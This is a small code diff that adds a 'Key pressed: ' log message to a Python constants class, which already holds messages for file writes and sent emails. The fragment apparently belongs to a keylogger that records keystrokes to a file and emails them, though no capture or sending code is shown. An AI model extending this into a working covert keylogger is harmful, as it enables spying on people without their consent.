@@ -25,6 +25,7 @@ class Constants:
     LOG_MESSAGE_PROGRAM_STARTED = "Program started"
     LOG_MESSAGE_FILE_WRITTEN = "File written"
     LOG_MESSAGE_EMAIL_SENDED = "Email sended"
+    LOG_MESSAGE_KEY_PRESSED = "Key pressed: "
 
     #File options
     FILE_OPTIONS_APPEND = "a"
